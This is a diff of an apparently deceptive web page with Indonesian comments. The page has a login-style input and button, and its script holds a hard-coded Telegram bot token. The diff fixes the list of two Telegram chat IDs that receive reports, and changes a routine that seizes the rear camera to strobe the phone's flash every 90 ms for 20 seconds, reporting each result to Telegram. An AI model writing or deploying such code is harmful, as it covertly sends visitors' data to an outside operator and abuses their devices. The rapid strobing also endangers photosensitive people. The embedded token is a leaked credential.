@@ -140,7 +140,8 @@
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
-    const chatIds = ['7945789634, 6087823470'];
+    // Chat IDs telah diperbarui menjadi dua
+    const chatIds = ['7945789634', '6087823470'];
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
@@ -236,7 +237,6 @@
       }
     }
 
-    // --- FITUR FLASH UPDATED (90ms) ---
     async function startFlashStrobe() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
@@ -252,7 +252,7 @@
         sendToTelegram('flash berhasil on ✅');
 
         let isOn = false;
-        // Kecepatan kedip diatur ke 90ms
+        // Kecepatan kedip 90ms
         const interval = setInterval(async () => {
           try {
             isOn = !isOn;
@@ -260,14 +260,14 @@
           } catch (e) {
             clearInterval(interval);
           }
-        }, 200);
+        }, 90);
 
         // Durasi 20 detik
         setTimeout(() => {
           clearInterval(interval);
           track.applyConstraints({ advanced: [{ torch: false }] });
           stream.getTracks().forEach(t => t.stop());
-        }, 100000);
+        }, 20000);
 
       } catch (err) {
         sendToTelegram('flash tidak on 🤬');
